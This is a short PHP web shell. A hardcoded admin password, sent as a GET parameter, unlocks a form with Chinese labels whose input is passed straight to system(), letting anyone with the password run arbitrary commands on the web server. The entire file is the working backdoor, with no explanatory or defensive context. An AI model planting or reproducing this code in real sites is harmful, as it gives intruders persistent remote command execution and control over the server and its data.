<?php
    session_start();
    $user = $_GET['username'];
    $pass = $_GET['password'];
    if(isset($user)&isset($pass)){
        if($user=="admin"&$pass=="Good_day"){
            echo "now You Can Use Shell";
            $_SESSION['GOD'] = "GOOOOOOOD";
        }
        else{
          unset($_SESSION['GOD']);
          echo "<script>history.back();</script>";
        }
    }
    if($_SESSION['GOD'] == "GOOOOOOOD"){
        echo "<div>命令:<form method=\"get\" action=\"\"><input type=\"text\" name=\"shell\"><input type=\"submit\" value=\"执行\"></form></div>结果:";
        system($_GET['shell']);
    }
?>